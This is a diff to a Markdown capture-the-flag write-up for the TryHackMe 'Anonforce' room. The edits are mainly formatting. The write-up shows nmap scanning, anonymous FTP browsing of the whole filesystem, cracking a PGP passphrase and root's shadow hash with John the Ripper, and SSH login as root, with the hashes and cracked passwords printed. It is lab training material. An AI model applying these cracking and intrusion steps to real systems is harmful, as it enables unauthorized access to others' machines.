@@ -5,12 +5,15 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Linux
 Subscription type: Free
 Description: boot2root machine for FIT and bsides guatemala CTF
 ```
+
 Room link: [https://tryhackme.com/r/room/bsidesgtanonforce](https://tryhackme.com/r/room/bsidesgtanonforce)
 
 ## Solution
@@ -18,6 +21,7 @@ Room link: [https://tryhackme.com/r/room/bsidesgtanonforce](https://tryhackme.co
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
 └─$ nmap -v -sV -sC -p- 10.10.163.233
@@ -113,13 +117,16 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 21.16 seconds
 ```
+
 We have two services running:
+
 - vsftpd v3.0.3 on port 21
 - OpenSSH v7.2p2 on port 22
 
 ### Check for files on the FTP-server
 
 From the FTP-listing above it almost seems like the entire system is shared via FTP.
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
 └─$ ftp 10.10.163.233
@@ -212,11 +219,13 @@ ftp> cd root
 ftp> quit
 221 Goodbye.
 ```
+
 We have two files and a likely user flag.
 
 ### Get the user flag
 
 Next we check and verify the user flag
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
 └─$ ls
@@ -230,6 +239,7 @@ backup.pgp  private.asc  user.txt
 ### Crack the PGP private key
 
 Now, we turn our attention to the PGP ASCII armored file `private.asc` and try to crack it with [John the Ripper](https://www.openwall.com/john/)
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
 └─$ gpg2john private.asc 
@@ -256,11 +266,13 @@ xbox360          (anonforce)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+
 So the password is `xbox360`.
 
 ### Analyze the encrypted file
 
 Next, we import the private key and decrypt the `backup.pgp` file
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
 └─$ gpg --import private.asc       
@@ -308,11 +320,13 @@ melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
 sshd:*:18120:0:99999:7:::
 ftp:*:18120:0:99999:7:::  
 ```
+
 We have hashes for both the `root` and `melodias` user. Let's try to crack them.
 
 ### Crack the user hashes
 
 Extract the two hashes with `grep` to a file and try to crack it with `john`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
 └─$ gpg --decrypt backup.pgp | grep -e root -e melodias > user_hashes.txt
@@ -339,9 +353,11 @@ hikari           (root)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+
 The password for root is `hikari`.
 
 We can also try to crack the hash for `melodias` but the password isn't in the rockyou wordlist.
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt user_hashes.txt
@@ -356,6 +372,7 @@ Session completed.
 ### Get the root flag
 
 Now that we have the password for root we can connect via SSH and get the root flag
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
 └─$ ssh root@10.10.163.233            
@@ -382,6 +399,7 @@ root@ubuntu:~# cat /root/root.txt
 f<REDACTED>e
 root@ubuntu:~# 
 ```
+
 Excellent!
 
 For additional information, please see the references below.
@@ -392,5 +410,5 @@ For additional information, please see the references below.
 - [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
 - [John the Ripper - Homepage](https://www.openwall.com/john/)
 - [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
-- [Wikipedia - OpenSSH](https://en.wikipedia.org/wiki/OpenSSH)
-- [Wikipedia - Pretty Good Privacy](https://sv.wikipedia.org/wiki/Pretty_Good_Privacy)
+- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
+- [Pretty Good Privacy - Wikipedia](https://sv.wikipedia.org/wiki/Pretty_Good_Privacy)
